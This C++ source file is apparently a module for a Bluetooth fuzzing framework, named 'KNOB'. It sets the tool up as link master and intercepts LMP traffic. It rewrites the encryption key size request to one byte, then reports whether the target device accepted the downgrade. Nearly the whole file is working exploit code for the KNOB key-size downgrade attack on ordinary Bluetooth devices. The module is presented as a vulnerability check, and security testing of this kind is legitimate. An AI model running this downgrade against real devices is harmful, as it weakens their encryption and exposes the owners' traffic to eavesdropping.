#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters
static const char *filter_lmp_encryption_key_size_req;
static const char *filter_lmp_accepted_key_size_req;
static const char *filter_lmp_rejected_key_size_req;
// Vars
static bool sent_enc_key_size = false;

// Setup
static const char *module_name()
{
    return "KNOB";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 6000;
    config->bluetooth.disable_role_switch = true; // Ensure we are always the link master
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    filter_lmp_encryption_key_size_req = packet_register_filter("btbrlmp.op == 16");
    filter_lmp_accepted_key_size_req = packet_register_filter("btbrlmp.op == 3 && btbrlmp.opinre == 16");
    filter_lmp_rejected_key_size_req = packet_register_filter("btbrlmp.op == 4 && btbrlmp.opinre == 16");
    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    packet_set_filter(filter_lmp_encryption_key_size_req);
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (packet_read_filter(filter_lmp_encryption_key_size_req))
    {
        wd_log_y("LMP_ENCRYPTION_KEY_SIZE_REQ detected");
        wd_log_y("Changing key size to 1");
        // Atempt KNOB (Change key size to 1)
        pkt_buf[2 + 2 + 1] = 1;
        sent_enc_key_size = true;

        return 1;
    }
    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    packet_set_filter(filter_lmp_accepted_key_size_req);
    packet_set_filter(filter_lmp_rejected_key_size_req);
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (sent_enc_key_size)
    {
        if (packet_read_filter(filter_lmp_accepted_key_size_req))
        {
            wd_log_r("KNOB Detected!!! Device vulnerable");
            module_request_t *m = (module_request_t *)p;
            m->stop = 1; // Request process to stop
            return 1;
        }
        else if (packet_read_filter(filter_lmp_rejected_key_size_req))
        {
            wd_log_g("KNOB Rejected. Device secure");
            module_request_t *m = (module_request_t *)p;
            m->stop = 1; // Request process to stop
        }
    }
    return 0;
}